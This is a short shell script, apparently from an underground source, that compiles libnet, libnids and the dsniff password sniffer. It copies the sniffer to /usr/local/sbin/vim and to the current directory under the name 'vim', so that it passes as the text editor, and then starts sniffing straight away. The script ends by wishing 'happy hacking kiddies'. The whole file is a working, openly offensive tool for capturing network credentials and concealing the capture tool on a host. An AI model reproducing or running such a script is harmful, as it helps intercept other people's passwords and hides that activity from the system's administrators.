#!/bin/sh
echo ""
echo "Simple Auto Sniffer installer by c0w-d0g"
echo ""
id;
w;
sleep 5;
echo "Installing libnet on `hostname`..."
cd libnet
echo ""
pwd;
echo ""
sh configure
sleep 2;
echo ""
echo "Configured.."
make;
echo ""
echo ""
echo "Running make install of libnet"..
sleep 5;
echo ""
make install;


cd ..
pwd;
echo ""
echo "Making libnids on `hostname`"
sleep 5;
echo ""
cd libnids
sh configure
echo ""
make;

echo "Running make install of libnids"
make install;

clear;
cd ..
echo "Current dir is `pwd`";
echo ""
echo "Installing Sniffer..."
echo ""
sleep 4;
cd sniff
echo ""
sh configure
make;
echo "Time to install the sniffer with make install...";
sleep 3;
make install;
cd ..
ls
clear;
clear;
echo "U need to be ROOT to continue..."
echo ""
id;sleep 3;
echo ""
export PATH=$PATH:/usr/local/sbin:/usr/local/bin
echo "Since this script its just for time saving.."
echo "There is little error checking in it..."
echo "However it should work on any system that dsniff can handle"
echo "Dsniff is usually installed in /usr/local/sbin/dsniff.."
echo ""
echo "Dsniff is actually installed in `which dsniff`"
echo ""
sleep 3;
echo "However I suggest you change the name of it..."
echo "The new name for dsniff will be vim"
ABC=`which dsniff`
DEF=`pwd $ABC`
cp `which dsniff` /usr/local/sbin/vim
echo ""
sleep 5;
echo ""
echo "Okay to run the sniffer goto the Directory /usr/local/sbin/"
echo "Then ./vim..."
echo ""
echo "In the future I suggest you run ./vim -m";
echo "In 5 seconds I will auto start the sniffing!"
echo "c0w_d0g... says happy hacking kiddies"
sleep 5;
echo ""
echo "Putting the sniffer in your current directory as well.."
cp `which dsniff` vim;
$ABC -m
exit;
